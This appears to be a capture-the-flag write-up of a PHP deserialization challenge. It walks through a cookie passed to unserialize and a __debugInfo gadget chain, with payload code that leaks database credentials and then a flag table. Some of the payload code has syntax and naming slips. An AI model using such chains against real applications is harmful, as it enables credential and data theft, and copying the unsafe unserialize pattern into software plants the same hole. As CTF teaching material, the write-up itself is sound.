# We can see this particular line
```php
if (isset($_COOKIE['prefs'])) {
    // Unserialize, Interesting and malicious.
    $prefs = unserialize($_COOKIE['prefs']);
    // Checking if the $prefs object belongs to the class UserPrefs
    if (!($prefs instanceof UserPrefs)) {
        echo "Unrecognized data: ";
        var_dump($prefs);
        exit;
    }
}
```
That means we have user controlled unserialization which is dangerous, If we get the proper gadgets we'll get previleged access. If $prefs is not an instance of UserPrefs then it will var_dump($prefs), So it will dump the data held inside $prefs.

Also we can see this line,

```php
$albums = new Albums(new MysqlRecordStore($mysql_host, $mysql_user, $mysql_password, $mysql_database, 'albums'));
```
So we're initializing a class Albums, with the class MysqlRecordStore which would be passed into the contructor of the Albums ie, Store as we can see from its class definition.

```php
class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }

    public function getAlbum($id) {
        return $this->store->getRecord($id);
    }

    public function addAlbum($album) {
        return $this->store->addRecord($album);
    }

    public function updateAlbum($id, $album) {
        return $this->store->updateRecord($id, $album);
    }

    public function deleteAlbum($id) {
        return $this->store->deleteRecord($id);
    }

    public function getAllAlbums() {
        return $this->store->getAllRecords();
    }

    public function __debugInfo() {
        return $this->getAllAlbums();
    }
```
We can see its calling getAllAlbums, now this is from the class 'MysqlRecordStore', Now this class has an interesting method which as follows.
```php
public function getAllRecords() {
        $stmt = $this->mysqli->prepare("SELECT * FROM {$this->table}");
        $stmt->execute();
        $rows = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
        $records = array();
        foreach ($rows as $row) {
            $record = new Record($row['id']);
            foreach ($row as $key => $value) {
                $record->$key = $value;
            }
            $records[] = $record;
        }
        return $records;
    }
```
ie, Whatever table name that we pass into that new Album's instance we'll get the flag, as we know if $prefs is not an instance of UserPrefs then we'll get to call var_dump on the object which is an instance of the Album class now since var_dump() is being called the function __debugInfo will get called automatically since it's a magic function.

So, __debugInfo() will call getAllAlbums which will again call getAllRecords which will fetch the flag, then var_dump($prefs) will show us the contents the of the $prefs object hence we will get the flag, but we have a problem we don't the have the mysql creds, for that there is another class called CsvRecordStore in records.php, that also has the method getAllRecord and it's valid as its just reading the file into a string and then calls array_map with a callback function str_getcsv on it, and then just returns the value of each key and value, then var_dump() gets called on it and we'll get the db creds.

Here is the payload for leaking the flag, we'll have to give it as a cookie.

```php 
class Album(){
    private store;
    public function __construct($store) {
        $this->store = $store;
}
}

class CsvRecordStore(){
    private $file;
    public function __construct($file) {
        $this->file = $file;
    }
}

$leak_db_creds = new Album(new CsvRecordStore('db_creds.php'));
$enc_leak = urlencode(serialize($leak_db_creds));
```

Hence we'll get the creds, Now we can leak the flag now.

ie;

```php
class Albums{
    private $store;
    public function __construct($store) {
        $this->store = $store;
}
}

class MysqlRecordStore{
    private $mysqli;
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;

    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->mysqli = new mysqli($host, $user, $pass, $db);
        $this->table = $table;
    }
}

$leak_db_creds = new Albums(new MysqlRecordStore('mysql','user','yeah_im_different','challenge', 'flag'));
$enc_leak = urlencode(serialize($leak_db_creds));
?>
```

And we'll get the flag.
